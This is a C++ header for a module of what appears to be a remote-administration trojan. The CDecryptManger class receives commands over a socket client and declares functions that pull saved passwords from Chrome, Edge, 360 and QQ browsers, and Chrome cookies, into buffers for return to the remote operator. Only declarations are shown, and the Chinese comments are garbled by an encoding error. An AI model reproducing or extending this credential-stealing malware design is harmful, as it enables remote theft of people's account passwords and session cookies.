#pragma once
#include "Manager.h"
#include <stdio.h>
#include <windows.h>
#include <cassert>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include<vector>
#include "GetBrowserInfo.h"
#include "Get360seInfo.h"
using namespace std;
enum
{

	COMMAND_LLQ_GetChromePassWord,
	COMMAND_LLQ_GetEdgePassWord,
	COMMAND_LLQ_GetSpeed360PassWord,
	COMMAND_LLQ_Get360sePassWord,
	COMMAND_LLQ_GetQQBroPassWord,
	COMMAND_LLQ_GetChromeCookies,

};


class CDecryptManger : public CManager
{
public:
	CDecryptManger(ISocketBase* pClient);
	virtual ~CDecryptManger();
	void senderror();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	char* GetCookiesChar(vector<BrowserData>* pPass, int* memLen);
	char* GetPassWChar(vector<BrowserCookies>* pCookies, int* memLen);	
	void DeleteMem(char** pChromeC);											
	bool GetChromeCookies(char** pChromeC, int* memLen);			// ��ȡchrome cookies
	bool GetChromePassWord(char** pChromePW, int* memLen);			// ��ȡchrome���������
	bool GetEdgePassWord(char** pChromePW, int* memLen);			// ��ȡwindows10 edge���������
	bool GetQQBroPassWord(char** pQQPW, int* memLen);				// ��ȡQQ���������
	bool GetSpeed360PassWord(char** pChromePW, int* memLen);		// ��ȡspeed360�������������
	bool Get360sePassWord(char** pChromePW, int* memLen);			// ��ȡ360��ȫ���������
};
